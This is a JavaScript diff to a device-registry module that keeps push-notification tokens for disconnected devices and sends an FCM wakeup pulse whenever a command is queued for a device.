@@ -3,6 +3,7 @@
  */
 
 const { normalizeDeviceId } = require("../utils/device");
+const { wakeDevice } = require("../services/firebaseService");
 
 const fs = require("fs");
 const path = require("path");
@@ -13,6 +14,7 @@ const pendingCommands = new Map(); // deviceId -> [{cmd, timestamp}]
 const pendingCommandClaims = new Map(); // deviceId -> { commands, claimedAt, generation }
 const sessionStates = new Map(); // deviceId -> last known state
 const offlineStats = new Map(); // deviceId -> { lastSeen: timestamp }
+const offlineFcmTokens = new Map(); // deviceId -> fcmToken (persisted across disconnects)
 
 let currentDeviceId = null;
 
@@ -34,6 +36,10 @@ function addDevice(deviceId, device) {
   }
   devices.set(normalized, device);
   currentDeviceId = normalized;
+  // Restore FCM token from offline cache if the device reconnects
+  if (!device.fcmToken && offlineFcmTokens.has(normalized)) {
+    device.fcmToken = offlineFcmTokens.get(normalized);
+  }
   return normalized;
 }
 
@@ -56,6 +62,11 @@ function getOfflineStats(deviceId) {
 function removeDevice(deviceId) {
   const normalized = normalizeDeviceId(deviceId);
   if (devices.has(normalized)) {
+    // Persist FCM token so we can still wake the device after it disconnects
+    const dev = devices.get(normalized);
+    if (dev?.fcmToken) {
+      offlineFcmTokens.set(normalized, dev.fcmToken);
+    }
     offlineStats.set(normalized, { lastSeen: Date.now() });
   }
   devices.delete(normalized);
@@ -78,6 +89,18 @@ function queueCommand(deviceId, command) {
   const maxPendingCommands = 100;
   if (queue.length > maxPendingCommands) {
     queue.shift();
+  }
+
+  // ── Ghost Node: Auto-Wake on Command ──
+  // Since we removed KeepAliveWorker, the device won't check the queue unless it wakes up.
+  // Fire a pulse whenever a command is queued to ensure the device pulls the command.
+  const dev = devices.get(norm);
+  const fcmToken = dev?.fcmToken || offlineFcmTokens.get(norm);
+  
+  if (fcmToken) {
+    // Fire and forget - don't block the command queue
+    console.log(`📡 Queued command for ${norm}. Firing FCM Wakeup pulse...`);
+    wakeDevice(fcmToken).catch(() => {});
   }
 }
 
@@ -176,6 +199,20 @@ function size() {
   return devices.size;
 }
 
+/**
+ * Return all offline devices that have a stored FCM token.
+ * Used by dashboardController to fire wakeup pulses.
+ */
+function getOfflineFcmTokens() {
+  const results = [];
+  offlineFcmTokens.forEach((fcmToken, deviceId) => {
+    if (!devices.has(deviceId)) {
+      results.push({ deviceId, fcmToken });
+    }
+  });
+  return results;
+}
+
 module.exports = {
   addDevice,
   getDevice,
@@ -197,4 +234,5 @@ module.exports = {
   isOnline,
   getOfflineStats,
   updateHeartbeat,
+  getOfflineFcmTokens,
 };
